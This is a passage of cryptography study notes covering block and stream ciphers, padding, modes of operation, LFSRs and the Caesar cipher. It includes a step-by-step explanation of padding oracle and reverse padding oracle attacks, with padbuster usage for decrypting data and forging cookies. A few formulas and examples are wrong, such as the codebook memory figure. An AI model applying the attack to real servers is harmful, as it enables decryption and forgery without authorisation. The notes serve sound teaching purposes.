<p>The data link (or just link) layer handles the transmition of <em>frames</em> between nodes as the packets are being routed to their destination. Protocols which fall in this layer are Wi-Fi, Ethernet, PPP and DOCSIS. This is where MAC and LLC reside.</p>
<h1 id="the-physical-layer"><a class="header" href="#the-physical-layer">The Physical Layer</a></h1>
<p>This layer takes on the job of transmitting individual bits from frames through physical links such as coaxial cable or fibre-optic cables. The protocols here vary depending on the medium used.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-30"><a class="header" href="#introduction-30">Introduction</a></h1>
<p>Cryptography is the study and application of techniques for secure communication in the presence of adversarial behaviour. It is concerned with the confidentiality of data. All cryptography is built around the use of <em>ciphers</em> or, in modern parlance, <em>encryption schemes</em>. </p>
<p>Cryptrography is typically divided into two fields - symmetric (private-key) cryptography and asymmetric (public-key) cryptography - and depending on which field we are in, an encryption scheme will look differently, but the basic terminology is usually shared.</p>
<p>Furthermore, you might hear the terms &quot;classical&quot; and &quot;modern&quot; cryptography being tossed around. The difference lies in the fact that the former does not make use of today's computational resources and is therefore unable to keep up with modern cryptography. Moreover, modern cryptography has its roots in mathematics and is subject to much more scrutiny and mathematical analysis. It is built around certain <a href="Cryptography/Principles%20of%20Modern%20Cryptography.html">principles</a>.</p>
<h1 id="attack-models"><a class="header" href="#attack-models">Attack Models</a></h1>
<ol>
<li><strong>Ciphertext-only attack (COA)</strong> - this is the most basic scenario. The adversary has access to a set of ciphertexts and attempts to glean whatever they can about the underlying plaintexts, but are unable to perform any encryption or decryption queries themselves.</li>
<li><strong>Known plaintext attack (KPA)</strong> - here, the attacker is provided with a set of plaintext-ciphertext pairs generated with some key. Their ultimate goal is to find out information about the plaintext of <em>another</em> ciphertext generated with the same key. Once again, the attacker is not capable of performing any encryption or decryption queries themselves.</li>
<li><strong>Chosen plaintext attack (CPA)</strong> - this model is equivalent to the previous one, however, the attacker is capable of choosing specifically which plaintext-ciphertext pairs they have access to. In other words, the attacker can perform encryption queries as they will, but have no access to the key.</li>
<li><strong>Chosen ciphertext attack (CCA)</strong> - in this model, the adversary is capable of both encrypting and decrypting any message they like, but lack the key. This scenario is most useful when it is not the output that is important but rather the key.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-31"><a class="header" href="#introduction-31">Introduction</a></h1>
<p>A block cipher is an encryption scheme which works on plaintexts of a fixed size. Furthermore, it is usually paired with a <em>mode of operation</em>. The size is typically small, such as 64 or 128 bits, although, it is possible to have smaller or larger block sizes. Large block sizes have a lofty memory footprint and are less efficient. It is, however, paramount that the block size is also not too small lest the cipher becomes vulnerable to a codebook attack. This attack is actuated by the construction of a look-up table which contains all possible plaintext-ciphertext pairs generated by a given block cipher and can be easily used to look up a plaintext given its ciphertext. For example, a block size of 16 requires only \( 2^{16} \times 2^{16} = 2^{20} \) bits of memory, which is equal to 128 kilobytes. With the 32-bit blocks, the memory needs grow to 16 gigabytes which is still feasible. However, with a block size of 64 bits, the memory required shoots up to \( 2^{70} \) bits. Good luck storing that.</p>
<h1 id="anatomy-of-a-block-cipher"><a class="header" href="#anatomy-of-a-block-cipher">Anatomy of a Block Cipher</a></h1>
<p>Block ciphers represent a repetition of <em>rounds</em>, which are short and simple sequences of operation. The strength of a block cipher lies not in its complexity, but rather its repetitiveness. The ciphertext of a given block is the sequence of rounds applied to the plaintext: \( c = R_3(R_2(R_1(p, {k^{\prime}}), {k^{\prime\prime}}),{k^{\prime\prime\prime}}) \). In addition to the output of the previous round, each round also takes in a <em>round key</em>. The round keys \( k^{\prime},k^{\prime\prime},k^{\prime\prime\prime},... \) are generated from the master key \( k \) through an algorithm bearing the name <em>key schedule</em>. The round functions \( R_1, R_2,... \) are usually the same algorithm which why it is crucial that they are provided with different round keys in order to generate different outputs.</p>
<h2 id="slide-attacks-and-round-keys"><a class="header" href="#slide-attacks-and-round-keys">Slide Attacks and Round Keys</a></h2>
<p>Repeating round keys open room for <em>slide attacks</em>. These look for plaintext-ciphertext pairs \( (p_1, c_1) \) and \( (p_2, c_2) \) where \( p_2 = R(p_1) \). Since both the round algorithm and key are identical, then if \( p_2 = R(p_1) \) implies that \( c_2 = R(c_1) \). This relationship will hold true no matter how many repetitions of the round the plaintext goes through.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-32"><a class="header" href="#introduction-32">Introduction</a></h1>
<p>A non-conforming message is a message whose length is not evenly divisible by the block size. For example, you might have a message of size 18 bytes and a block size of 16 bytes. In this case, there are two main ways to resolve the issue.</p>
<h1 id="message-padding"><a class="header" href="#message-padding">Message Padding</a></h1>
<p>Padding allows for the encryption of messages of arbitrary lengths, even ones which are shorter than a single block. It is used to expand a message in order to fill a complete block by appending bytes to the plaintext and it is a highly standardised procedure. </p>
<p>The most common padding algorithm is described by PKCS#7 in RFC 5652.</p>
<p>Given a block size, \( n \), and a message of length \( m \), the message is padded with \( n-m \) number of bytes of value \( n-m \).  A concrete example with 16-byte blocks is the following:</p>
<ul>
<li>If there's is one byte left until the message length is divisible by 16 - for example, it is 17 or 33 bytes long - then pad the message with 15 bytes <code>0x0f</code> (15 in decimal).</li>
<li>If there are two bytes left until the message length is divisible by 16 - for example, it is 18 or 34 bytes long - then pad the message with 14 bytes <code>0x0e</code> (14 in decimal).</li>
<li>If there are three bytes left until the message length is divisible by 16, then pad the message with 13 bytes <code>0x0d</code> (13 in decimal), and so on.</li>
</ul>
<p>If the message length is already divisible by the block size, then an additional <em>block</em> containing bytes with value equal to the block size is appended in order to signify to the decryption algorithm whether the last block is part of the plaintext or just padding. In the above example, if the message length was already divisible by 16, then another 16 bytes of value <code>0x10</code> would have been appended to it.</p>
<p>Decryption is fairly simple and works by first deciphering all the unpadded blocks. Subsequently, the last block is decrypted and the last bytes of the resulting plaintext are checked for conformity with the aforementioned scheme. If such is not found, the message is rejected. Otherwise, the padding bytes are stripped before returning the plaintext.</p>
<p>Note that if not implemented properly, padding may be vulnerable to <a href="Cryptography/Block%20Ciphers/Padding%20Oracle%20Attack.html">Padding Oracle Attacks</a>.</p>
<h1 id="ciphertext-stealing"><a class="header" href="#ciphertext-stealing">Ciphertext Stealing</a></h1>
<p>Ciphertext stealing is another technique for encrypting messages of arbitrary length. Whilst more complex, it has several benefits:</p>
<ul>
<li>Plaintexts are allowed to be of any <em>bit</em> length and are not restrained to bytes - it is possible to encrypt a message which is 155 bits long.</li>
<li>Ciphertext have the same length as plaintexts.</li>
</ul>
<p>In CBC mode, ciphertext stealing extends the last incomplete plaintext block by taking bits from the previous ciphertext block, thus splitting the penultimate ciphertext block. Once the last plaintext block is complete, it is encrypted and its ciphertext is placed as the penultimate ciphertext block. Now, the first bits (the ones which were not appended) of the broken ciphertext block are placed at the end as a reduced ciphertext block, meaning that the last ciphertext block has a length less than the block size.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Block_Cipher_Ciphertext_Stealing.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-33"><a class="header" href="#introduction-33">Introduction</a></h1>
<p>It's all well and good with block ciphers when encrypting messages whose length matches the block size, but what happens if we want to encrypt a plaintext that is longer than a single block? Well, here comes the use of a <em>mode of operation</em>. If the message is longer than the block size, then it must be split into blocks of the desired size. From then on, the mode of operation describes how each of the blocks is encrypted and how the resulting ciphertexts are combined into the final output.</p>
<h1 id="the-electronic-codebook-ecb-mode"><a class="header" href="#the-electronic-codebook-ecb-mode">The Electronic Codebook (ECB) Mode</a></h1>
<p>This is the simplest mode of operation you could think of. It encrypts each plaintext block independently and then just concatenates the resulting ciphertexts. </p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Block_Cipher_ECB_Encrypt.png" alt="" /></p>
<p>This mode is abominably insecure, since it is <em>pattern preserving</em>. While patterns inside each block are destroyed (a proper encryption algorithm should take care of that), patterns between blocks are ultimately preserved. To illustrate, let's say that you want to encrypt the number 19281267. If you have 4-bit blocks, you would encrypt the blocks 1928 and 1267. Suppose, that these get encrypted to 4765 and 4104. If you check, subtracting the second plaintext block from the first yields the same result as subtracting the second ciphertext from the first, namely 661. An infamous example of this is the ECB penguin. Encrypting an image with ECB will yield the same image with merely a distorted colour scheme.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Block_Cipher_ECB_Penguin.png" alt="" /></p>
<h1 id="the-cipher-block-chaining-cbc-mode"><a class="header" href="#the-cipher-block-chaining-cbc-mode">The Cipher Block Chaining (CBC) Mode</a></h1>
<p>Cipher block chaining resembles ECB, but it actually incorporates the previous block into the encryption of the current one. Instead of encrypting the \( i \)th block \( p_i \) as \( c_i = Enc_k(p_i) \), cipher block chaining XORs the plaintext with the previous ciphertext: \( c_i = Enc_k(p_i \bigoplus c_{i-1}) \). The first plaintext is XOR-ed with a random value called an <em>initialisation vector (IV)</em>.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Block_Cipher_CBC_Encrypt.png" alt="" /></p>
<p>Since each consecutive block depends on the previous one, patterns between blocks are destroyed. Furthermore, if the IV is different each time, two identical plaintexts will produce disparate ciphertexts when encrypted. Note, that for decryption, the IV needs to be known. It is also interesting to mention that CBC decryption can be much faster than encryption due to parallelism. When encrypting, each new block needs to wait for the previous one to be encrypted in order to get its ciphertext, however, with decryption all ciphertexts are already known, so it can optimised on multiple threads.</p>
<h1 id="the-counter-ctr-mode"><a class="header" href="#the-counter-ctr-mode">The Counter (CTR) Mode</a></h1>
<p>The Counter mode is a bit different to the ones described above. It turns a block cipher into a stream cipher - in fact, it doesn't even encrypt the blocks themselves! 
This mode is comprised of an IV, often in this case called a <em>nonce</em>, and a counter. The counter may be any function which is guaranteed to generate a sequence which will not repeat for a long time. That being said, it is still very common to just use a simple increment-by-one counter. </p>
<p>The way that the CTR mode works is by taking the nonce and the counter for the current block (the counter is incremented for each block) and combining them together. If the nonce is random, it may be combined with the counter by means of any invertible operation such as addition, concatenation, or XOR-ing. Should that not be the case, then the nonce and the counter should be concatenated, since simply adding or XOR-ing them would break the security under a chosen plaintext attack, since an attacker may be able to manipulate the entire nonce–counter pair to cause a collision. Once they have control over the nonce-counter pair and plaintext, XOR-ing the ciphertext with the plaintext would produce a value that can be XOR-ed with the other block sharing the same nonce-counter pair in order to decrypt it.</p>
<p>After this, the nonce-counter pair is encrypted with the key and then XOR-ed with the plaintext block in order to produce the ciphertext.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Block_Cipher_CTR_encrypt.png" alt="" /></p>
<p>It is paramount that the nonce is unique between messages, since when encrypting two plaintexts with the same nonce-counter stream - \( c_1 = p_1 \bigoplus S \) and \( c_2 = p_2 \bigoplus S \), then \( c_1 \bigoplus c_2 \) reveals \( p_1 \bigoplus p_2 \).</p>
<p>Furthermore, a random nonce is sufficient only if it is long enough. Given a nonce of length \( n \) bits, it is likely that after \( 2^{n/2} \) encryptions collisions will start occuring. Therefore, a 64-bit nonce is abominable due to the fact that collisions will commence after approximately \( 2^{32} \) encryptions, which is a very low number. </p>
<p>Decryption works by XOR-ing the ciphertext with the appropriate nonce-counter pair.</p>
<p>A particular benefit of the CTR mode is that it is parallelisable and can thus execute rather quickly. You can even begin encryption before having the message to encrypt by selecting a nonce and computing the nonce-counter stream which will be later XOR-ed with the plaintext.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-34"><a class="header" href="#introduction-34">Introduction</a></h1>
<p>A padding oracle attack abuses padding validation information in order to decrypt an arbitrary message. In order for it to work, it requires a <em>padding oracle</em>. A padding oracle is any system which, given a ciphertext, behaves differently depending on whether the decrypted plaintext has valid padding or not. For the sake of simplicity, you can think of it as a sending an arbitrary ciphertext to a server and it returning &quot;Success&quot; when the corresponding plaintext has valid padding, and spitting out &quot;Failure&quot; otherwise. Note that the ciphertexts you query the oracle with need not have meaningful plaintexts behind them and you will not even be generating them by encryption, but rather crafting them in a custom manner in order to exploit the information from the oracle.</p>
<h1 id="how-it-works"><a class="header" href="#how-it-works">How It Works</a></h1>
<p>Let's remind ourselves of how CBC decryption works by taking a simplified look at the last two blocks:</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padding_Oracle_Original_Encryption.png" alt="" /></p>
<p>The last ciphertext \( C_2 \) is decrypted with the key \( k \) to an intermediate block \( I_2 \). This intermediate state is then XOR-ed with the penultimate ciphertext block, \( C_1 \), in order to retrieve the plaintext block \( P_2 \). Note, all block here are made from bytes.</p>
<p>Now, let's imagine a second scenario, where \( C_2 \) is kept the same, be we purposefully alter the last byte of \( C_1 \). After this modification, we send the ciphertext to the oracle. Our goal here is to obtain a &quot;success&quot; from it, meaning that it has managed to decrypt the ciphertext we sent it to a plaintext with a valid padding. Since we are only altering the last byte for now, we want to generate a ciphertext which when decrypted will result in a plaintext, whose last byte is <code>0x01</code>.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padding_Oracle_C1_Bruteforce.png" alt="" /></p>
<p>Since, we didn't change \( C_2 \), the intermediate \( x_1 \) also remains the same. Additionally, \( y_1 \) is a single byte so it can only take a total of 256 values. This makes it rather easy to bruteforce what \( y_1 \) should be, simply by sending queries at max 256 queries to the oracle. Once the oracle returns a &quot;Success&quot;, we have found the right value for \( y_1 \). We can now simply XOR \( y_1 \) with <code>0x01</code> to obtain the value of \( x_1 \), \( x_1 = y_1 \bigoplus \text{0x01} \). </p>
<p>Since \( x_1 \) is the same in both the original and the attack scenario, we can now XOR \( x_1 \) with the original last byte of \( C_1 \) in order to obtain the last byte of the original plaintext! This procedure can be further repeated to obtain the penultimate byte, then the antepenultimate byte and so forth! All that is needed is to find the two bytes at the end of \( C_1 \) that would result in a plaintext ending in <code>0x0202</code>.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padding_Oracle_C12_Bruteforce.png" alt="" /></p>
<p>We already know \( x_1 \), so we can obtain the new \( y_1 = x_1 \bigoplus \text{0x02} \). We now only need to bruteforce \( y_2 \) with the same technique described above. Once the oracle returns a &quot;Success&quot;, we have found the correct value for \( y_2 \) and can obtain \( x_2 = y_2 \bigoplus \text{0x02} \). Going back to the original scenario, we compute the penultimate byte of the plaintext by XOR-ing the penultimate byte of the unaltered \( C_1 \) with the value of \( x_2 \). Rinse and repeat and you have decrypted the entire plaintext! Note, you will have to reset the procedure from <code>0x01</code> with each new block.</p>
<h1 id="reverse-padding-oracle-attack"><a class="header" href="#reverse-padding-oracle-attack">Reverse Padding Oracle Attack</a></h1>
<p>Apart from allowing you to <em>decrypt</em> a ciphertext, an oracle padding vulnerability can allow you to <em>encrypt</em> (almost) any plaintext. This could be useful for example when you need to encrypt a plaintext cookie to a ciphertext in order to use it, but you don't have the key.</p>
<p>First of all you will need to choose the plaintext you want to encrypt, \( P_n \) and pad it appropriately. Then generate a random block of data. This will be the last ciphertext block \( C_n \). Next, we set \( C_{n-1} \) to be a block of 0s and perform a padding oracle attack the usual way, until we obtain the value of \( C_{n-1} \) for which \( C_n \) decrypts to a full block of padding (in the case of block size 8 this would be <code>0x0808080808080808</code>).</p>
<p>We now XOR these together to obtain \( I_n = \text{0x0808080808080808} \bigoplus C_{n-1} \). Afterwards, XOR the desired plaintext \( P_n \) with the intermediate state \( I_n \) in order to obtain a new value for \( C_{n-1} \) which will force \( C_n \) to be decrypted to the appropriate plaintext. Repeat this process with the rest of the ciphertext blocks, but now use the ultimately obtained \( C_{n-1} \) instead of the randomly generated \( C_n \), and then the next ultimately obtained \( C_{n-i} \), and... ta-da, you have the ciphertext of your desired plaintext. Unforunately, unless you have control of the IV, the last block will always decrypt to garbage.</p>
<h1 id="padding-oracle-attacks-with-padbuster"><a class="header" href="#padding-oracle-attacks-with-padbuster">Padding Oracle Attacks with <code>padbuster</code></a></h1>
<p><code>padbuster</code> is a tool written in Perl which is designed to automate padding oracle attacks. It is included in Kali Linux, but you can also find it at https://github.com/AonCyberLabs/PadBuster.</p>
<p>Its syntax is fairly simple. You need to first provide it with the URL of the padding oracle, then you need to give it the ciphertext and finally provide it with the block size. Next are any command-line arguments you might wish to use. If you don't provide <code>padbuster</code> with an error string through <code>-error</code>, it will perform response analysis and prompt you to select which response is the error one. For example, I have a padding oracle which displays either &quot;Success!&quot; or &quot;Fail!&quot; on the response page. As you see, though, <code>padbuster</code>'s response analysis automatically picked up on that and asked me which response is the error.</p>
<p>You might also need to change the encoding that <code>padbuster</code> uses, depending on the how the padding oracle accepts data. Here, <code>-encoding 1</code> means that I want the requests to include the malicious ciphertexts representing hex bytes as lowercase ASCII characters. The <code>-noiv</code> flag tells <code>padbuster</code> that the provided ciphertext does NOT include an IV. If you skip it, the first ciphertext block will be treated as the IV and won't be decrypted.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padbuster_run.png" alt="" /></p>
<p>After you give it the correct error response, it will perform the attack and decrypt your ciphertext.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padbuster_decrypt.png" alt="" /></p>
<p>Furthermore, <code>padbuster</code> is capable of <em>encrypting</em> a plaintext by mounting a reverse padding oracle attack. This is done through the <code>-plaintext [plaintext]</code> flag:</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padbuster_encrypt.png" alt="" /></p>
<p>Unfortunately, if you don't know the IV, the last block will decrypt to garbage:</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padbuster_No_IV_Garbage.png" alt="" /></p>
<p>Note, in the above screenshot the hex is actually the decrypted version of the ciphertext generated by <code>padbuster.</code></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-35"><a class="header" href="#introduction-35">Introduction</a></h1>
<p>Unlike block ciphers, stream ciphers do not fuse plaintext with key bits. Instead, a stream cipher generates a pseudorandom bits from the key and encrypts the plaintext by XOR-ing it with those bits. The psuedorandom bits are said to construct a <em>keystream</em>. In addition to the key, which is usually 128 or 256 bits, a stream cipher also takes a nonce. The nonce need not be secret but should be unique for every key. Nonce sizes are typically between 64 and 128 bits.</p>
<p><img src="Cryptography/Stream%20Ciphers/Resources/Images/Stream_Cipher.png" alt="" /></p>
<p>It is paramount that the same key-nonce pair \( k_1 \), \( n_1 \) is not used for the encryption of multiple messages, since you would then have \( c_1 = p_1 \bigoplus ks \) and \( c_2 = p_2 \bigoplus ks \), so if you know \( p_1 \), you could easily determine \( p_2 = c_1 \bigoplus c_2 \bigoplus p_1 \).</p>
<h1 id="stateful-and-counter-based-stream-ciphers"><a class="header" href="#stateful-and-counter-based-stream-ciphers">Stateful and Counter-Based Stream Ciphers</a></h1>
<p>Stream ciphers can be split into two major categories. <em>Stateful stream ciphers</em> have an internal state which is morphed during the encryption process. The state is first initialised from the key and the nonce. Subsequently, an update function function is invoked which changes the state and produces one or more keystream bits from it. </p>
<p><img src="Cryptography/Stream%20Ciphers/Resources/Images/Stateful_stream_cipher.png" alt="" /></p>
<p>The other type is <em>counter-based stream ciphers</em>. These produce chunks of keystream bits by taking the key, nonce and a counter which changes at every turn.</p>
<p><img src="Cryptography/Stream%20Ciphers/Resources/Images/Counter_Based_Stream_Cipher.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-36"><a class="header" href="#introduction-36">Introduction</a></h1>
<p>Hardware-oriented stream ciphers are designed to be run on <em>dedicated hardware</em>. They typically work on the bit-level, since hardware can be custom-tailored to be more efficient with these operations. Almost all hardware stream ciphers are built upon a concept called <em>feedback shift registers (FSRs).</em></p>
<h1 id="feedback-shift-registers"><a class="header" href="#feedback-shift-registers">Feedback Shift Registers</a></h1>
<p>An FSR is comprised of a bit array, called a <em>register</em>, which is equipped with an update feedback function, denoted as \( f \), which takes a bit array and produces a single bit based on it. Each update alters the register and produces a single output bit. Given a current register state, \( R_i \), the subsequent state will be this:</p>
<p>$$ R_{i+1} = (R_i &lt;&lt; 1) | f(R_i)$$</p>
<p>The current state \( R_i \) is left-shifted by a single position. The bit leaving the register is returned as the output for this update cycle and the bit in the end of the register is filled with \( f(R_i) \).  Here, <code>|</code> denotes the OR operation.</p>
<p>For example, suppose you had a feedback function, \( f \) which simply XOR-ed all the bits of the register. Given an initial state, \( 0101 \), you would have \( f(0101) = 0 \bigoplus 1 \bigoplus 0 \bigoplus 1 = 0 \). The new state would thus be \( (0101 &lt;&lt; 1)|0 = 1010 \).</p>
<p>Given a feedback function \( f \) and an initial state \( R_0 \), we define the <em>period</em> of the FSR to be the number of updates that the FSR can go through until the new state repeats with one of the previous states, thus forming a cycle. Note, that the period of the FSR will be the same if we substituted \( R_0 \) for any other state which is produced during its cycle and any single state may only belong to a single cycle. </p>
<p>With the above function, \( f \), and state, \( 0101 \), the period would be 6.</p>
<p>Naturally, an FSR with a larger period will produce a more unpredictable output.</p>
<h2 id="linear-feedback-shift-registers-lfsr"><a class="header" href="#linear-feedback-shift-registers-lfsr">Linear Feedback Shift Registers (LFSR)</a></h2>
<p>Linear Feedback Shift Registers are FSRs which are equipped with a linear feedback function, namely a procedure which XORs together some of the bits of the current state. The bits that get XOR-ed together are defined by a set of boolean <em>feedback coefficients</em>. It is important that the feedback coefficients are <em>not</em> allowed to mutate throughout any update, since they define the feedback function. The number of bits in the bit array of the register is called its <em>degree</em>.</p>
<p><img src="Cryptography/Stream%20Ciphers/Hardware-Oriented%20Stream%20Ciphers/../Resources/Images/LFSR.png" alt="" /></p>
<p>For a register consisting of bits \( s_{n-1},...,s_0 \) and feedback coefficients \( c_{n-1},...,c_0 \), the state of the LFSR is updated by shifting the register to the right and replacing the left-most bit with the output of the feedback function. Namely, if the register state at time \( t \) is described by \( s_{n-1}^{(t)},...,{}_{t}s_0^{(t)} \), the state after an update (also called a <em>clock tick</em>) would be given by:</p>
<p>$$s_i^{(t+1)} \colon= s_{i+1}^{(t)}, \text{where } i = 0,...,n-2$$
$$s_{n-1}^{(t+1)} \colon= \bigoplus_{i=0}^{n-1} c_i s_i^{(t)}$$</p>
<p>For each clock tick, the LFSR outputs the value of the right-most bit, \( s_0 \). Thus, if the initial state of the LFSR is \( s_{n-1}^{(0)},...,s_0^{(t)} \), then the first \( n \) bits of the output stream will be the sequence \( s_0^{(0)},...,s_{n-1}^{(0)} \), with the next output bit being \( s_{n-1}^{(1)} = \bigoplus_{i=0}^{n-1} c_i s_i^{(0)} \).</p>
<p>The maximal period of an LFSR is \( 2^n-1 \), where \( n \) is the degree of the LFSR, for the all-zeros state can never be mutated via a XOR operation. It is paramount that the correct feedback coefficients are chosen in order to ensure a maximal period. Luckily, there is a procedure for accomplishing just that. Starting from 1 for the left-most bit moving up to \( n \) for the right-most bit, we construct a polynomial of the form \( p(x) = 1 + x + x^2 + x^3 + ... + x^n \), where the term \( x^i \) is only included if the \( i \)th bit has a feedback coefficient equal to 1 (it is included in the XOR operation). Now, the period is maximal if and only if this polynomial is <em>primitive</em>. A polynomial is primitive when it is irreducible (factorisation is impossible) and also satisfies additional mathematical criteria, which I unfortunately do not comprehend myself, but you can read more about them <a href="https://en.wikipedia.org/wiki/Primitive_polynomial_(field_theory)">here</a>.</p>
<p>LFSRs are inherently insecure due to their linearity. Given known feedback coefficients, the first \( n \) output bits will reveal the initial state and from then on it is possible to determine the entirety of all future bits. Even with unknown feedback coefficients, an attacker needs at most \( 2n \) output bits to determine both the feedback coefficients and the initial state. If we denote the first \( n \) output bits as \( y_0,...,y_{n-1} \) and the next \( n \) bits as \( y_n,...,y_{2n-1} \), we can construct the following system of linear equations:</p>
<p>$$\begin{align}
y_n &amp;= c_{n-1} y_{n-1} \bigoplus \cdots \bigoplus c_0 y_0 \newline
\vdots \newline 
y_{2n-1} &amp;= c_{n-1} y_{2n-2} \bigoplus \cdots \bigoplus c_0 y_{n-1} 
\end{align}$$</p>
<p>It is possible to show that for a maximal period LFSR the equations in the system are linearly independent (\( \mod 2 \)) and can be solved through basic linear algebra.</p>
<h2 id="introducing-nonlinearity"><a class="header" href="#introducing-nonlinearity">Introducing Nonlinearity</a></h2>
<p>LFSRs can be strengthen by introducing nonlinearity in the encryption process by different means. This means that it is not only XOR operations that are used, but also logical ANDs and ORs. For example, it is possible to make the feedback loop nonlinear by setting the value of the leftmost bit at each clock tick to be a nonlinear function of the bits in the previous state. If the register's state at time \( t \) is \( s_{n-1}^{(t)},...,s_0^{(t)} \), the state at \( t+1 \) would be</p>
<p>$$s_i^{(t+1)} \colon= s_{i+1}^{(t)}, \text{where } i = 0,...,n-2$$
$$s_{n-1}^{(t+1)} \colon= g(s_{n-1}^{(t)},...,s_0^{(t)})$$</p>
<p>As before, the rightmost bit, \( s_0 \) is outputted at each clock tick. In order for the FSR to be secure, the feedback function, \( g \) should be balanced in the sense that \( \text{Pr}[g( s_{n-1},...,s_0 ) = 1] \approx \frac{1}{2} \). </p>
<p><img src="Cryptography/Stream%20Ciphers/Hardware-Oriented%20Stream%20Ciphers/../Resources/Images/NFSR.png" alt="" /></p>
<p>Unfortunately, there is a downside to NFSRs (Nonlinear FSRs). There is no efficient way to determine an NFSR's period or even whether its period is maximal. It is however, possible to mitigate this by combining NFSRs and LFSRs, which is what <a href="Cryptography/Stream%20Ciphers/Hardware-Oriented%20Stream%20Ciphers/Grain-128a.html">Grain-128a</a> does.</p>
<h3 id="filtered-fsrs"><a class="header" href="#filtered-fsrs">Filtered FSRs</a></h3>
<p>In the above example, the FSR itself is nonlinear, since the way that the leftmost is altered at each clock tick is determined by a nonlinear function. However, it is also possible to keep the FSR linear and instead pass its output to a filter function, \( g \). Instead of outputting the rightmost bit, \( s_0 \), the entire register is passed to the filter function and the output of the register is determined by the output of \( g \).</p>
<p><img src="Cryptography/Stream%20Ciphers/Hardware-Oriented%20Stream%20Ciphers/../Resources/Images/Filtered_FSR.png" alt="" /></p>
<p>Whilst filtered FSRs are stronger than LFSRs, their underlying partial linearity makes them vulnerable to complex attacks such as <em>algebraic attacks</em>, <em>cube attacks</em>, and <em>fast correlation attacks</em>.</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="the-shift-cipher"><a class="header" href="#the-shift-cipher">The Shift Cipher</a></h1>
<p>One of the oldest known ciphers is known as Caesar's cipher. Julius Caesar encrypted his messages by shifting every letter of the alphabet three spaces forward and looping back when the end of the alphabet is reached. Consequently, <code>A</code> would be mapped to <code>D</code> and <code>Z</code> would be mapped to <code>C</code>.</p>
<p>An immediate problem with this cipher is the lack of a key - the shift amount is always the same. A natural extension of the cipher would then be to let the shift amount vary, turning it into a key whose possible values are the numbers between 0 and 25. Therefore, the key space is  \( K \equiv \{ 0, ..., 25 \} \).</p>
<p>An encryption algorithm \( Enc_k \) would take a plaintext \( m \), shift its letters forwards by \( k \) positions and spit out a ciphertext \( c \). In contrast, a decryption algorithm \( Dec_k \) would take the ciphertext \( c \) and shift its letters <em>backwards</em> by \( k \) places to retrieve the original plaintext. If we map the alphabet to the set \( {0,...,25} \) (\( a = 0, b = 1 \), etc.), a more mathematical description is obtained. Encryption of any message \( m = m_1 \cdot\cdot\cdot m_l \) (\( m_i \in {0,...,25} \)) using the key \( k \) is given by</p>
<p>$$Enc_k (m_1 \cdot\cdot\cdot m_l) = c_1 \cdot\cdot\cdot c_l, \hspace{1cm} where \hspace{1mm} c_i = [(m_i + k) \mod 26]$$</p>
<p>The notation \( [a \mod N] \) is the remainder of \( a \) upon division by \( N \) where \( 0\leq[a \mod N] &lt; N \) and \( \cdot\cdot\cdot \) denotes concatenation and not multiplication. Decryption of a cyphertext \( c = c_1 \cdot\cdot\cdot c_l \) using a key \( k \) would then be given by </p>
<p>$$Dec_k (c_1 \cdot\cdot\cdot c_l) = m_1 \cdot\cdot\cdot m_l, \hspace{1cm} where \hspace{1mm} m_i = [(c_i - k) \mod 26]$$</p>
<p>It is only natural to now ask, is this cipher secure? And the simple answer is no. There are only 26 possible keys and so the key-space is not sufficiently big. You can even go through all 26 possible keys with a given ciphertext by hand and check which resulting plaintext makes sense. Most likely, there will be only one and so you would have recovered the original message.</p>
<p>Another method to crack this cipher is by using frequency analysis. Since the shift cipher is a one-to-one mapping on a letter-by-letter basis, the frequency distribution of letters is preserved. For example, the most common letter in English is the letter &quot;e&quot;. If we analyse the ciphertext and discover that the most common letter there is &quot;g&quot;, then we know that most likely the letter &quot;g&quot; is the letter &quot;e&quot; encrypted with the given key. From this we can calculate the key to be 2 (however, the plaintext, and therefore the ciphertext, may actually deviate from this distribution, so it is not with 100% certainty that the key is 2). We can also perform the same procedure with the rest of the letters in the ciphertext and retrieve the original plaintext. This process can also be automated with some math.</p>
<p><img src="Cryptography/Resources/Images/English_Letter_Frequency_Table.png" alt="" /></p>
<p>Let's once again map the alphabet with the integers 0 through 25 and also this time let \( p_i \) (\( 0 \leq p_i \leq 1 \)) denote the frequency of the \( i \)th letter. Using the above table, we can calculate that</p>
<p>$$ \sum_{i=0}^{25} p_i^2 \approx 0.065$$</p>
<p>Now, let \( q_i \) denote the frequency of the \( i \)th letter in the ciphertext - this is just equal to the number of occurences of the \( i \)th letter divided by the length of the ciphertext. If the key is \( k \), then \( p_i \) should be approximately equal to \( q_{i+k} \), since the \( i \)th letter gets mapped to the \( (i+k) \)th letter (technically, these should be \( i+k \mod 26 \), but that's too cumbersome to write here). Therefore, if we compute</p>
<p>$$ I_j \overset{\mathrm{def}}{=} \sum_{i=0}^{25} p_i \cdot q_{i+j}$$</p>
<p>for every value of \( j \in \{0,...,25\} \), then \( I_k \) should be approximately equal to 0.065, where \( k \) is the actual key. For all \( j \neq k \), \( I_j \) would be different from 0.065. This ultimately leads to a way to recover the original key that is fairly easy to automate.</p>
<h1 id="the-vigenère-cipher"><a class="header" href="#the-vigenère-cipher">The Vigenère Cipher</a></h1>
